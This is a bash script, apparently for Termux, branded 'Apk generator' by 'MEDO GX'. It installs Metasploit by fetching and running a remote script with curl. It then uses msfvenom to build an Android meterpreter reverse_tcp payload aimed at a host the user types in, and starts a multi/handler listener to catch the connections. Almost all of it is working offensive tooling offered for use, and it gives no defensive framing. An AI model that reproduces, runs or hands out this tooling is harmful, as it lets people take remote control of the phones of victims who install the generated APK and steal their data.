#!/bin/bash

sleep 2
clear

########colors###########
red='\033[1;31m'
green='\033[1;32m'
####Dvariabales#####
you="https://www.youtube.com/@linux_whith_mohamed"
wa="https://wa.me/+201280501875"
te="https://t.me/MohamedvGX"

echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "

echo -e "  $red Developer : $green MEDO $red GX "
echo ''
echo -e " $red Youtube : $green $you "
echo " "
echo -e "  $green whatsapp : $red $wa "
echo ''
echo -e "     $green Telegram : $red $te "
sleep 3
clear
# دالة للتحقق مما إذا كان Metasploit مثبتًا
function check_metasploit_installed() {
    if command -v msfconsole >/dev/null 2>&1; then
        echo -e "$green [ ☆ ] Metasploit is installed."
        return 0
    else
        echo -e "$red [•] Metasploit is not installed."
        return 1
    fi
}

# دالة لتثبيت Metasploit
function install_metasploit() {
    echo "Installing Metasploit..."
    pkg update && pkg upgrade -y
    pkg install wget curl openssh git -y
    pkg install ruby -y
    pkg install ncurses-utils -y
    curl -LO https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
    chmod +x metasploit.sh
    ./metasploit.sh
    echo -e "$green [☆] Metasploit installation completed."
}

# دالة لسؤال المستخدم إذا كان يريد التثبيت
function prompt_install_metasploit() {
    read -p "Do you want to install Metasploit? (y/n): " choice
    case "$choice" in
        y|Y )
            install_metasploit
            ;;
        n|N )
            echo -e "$red [!] Installation aborted."
            ;;
        * )
            echo -e "$red [!] Invalid choice. Please enter y or n."
            prompt_install_metasploit
            ;;
    esac
}

# التحقق مما إذا كان Metasploit مثبتًا واستدعاء الدالة المناسبة
if ! check_metasploit_installed; then
    prompt_install_metasploit
else
    echo ''
    echo "No need to install Metasploit. It is already installed."
fi
sleep 2s
clear
echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
echo -e "      $red developer : $green Medo GX "
echo -e "     $red script $green v1 "
echo ''
echo ''
read -p 'please Enter your host : ' ip 
echo ""
read -p 'please Enter payload name : ' path 
msf="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ip Lport=4444 -o $path"
sleep 3s 
clear
echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
echo -e "      $red developer : $green Medo GX "
echo -e "     $red script $green v1 "
echo ''
echo ''

echo '[1] generate payload '
echo ''
echo '[2] start listener '
echo ''
echo '[3] youtube '
echo ''
read -p 'choice : ' ch
if [ $ch == 1 ]; then 
    sleep 1s
    clear
    echo 'Generating your payload please wait ....'
    $msf
elif [ $ch == 2 ]; then 
    sleep 1s
    clear
    echo 'starting listener please wait ...' 
    msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; run"
elif [ $ch == 3 ]; then 
    sleep 1s
    clear
    termux-open-url https://www.youtube.com/@linux_whith_mohamed

else 
    echo -e '$red Error : please choose an number from list {1,2,3}'
    bash gx.sh
    
fi
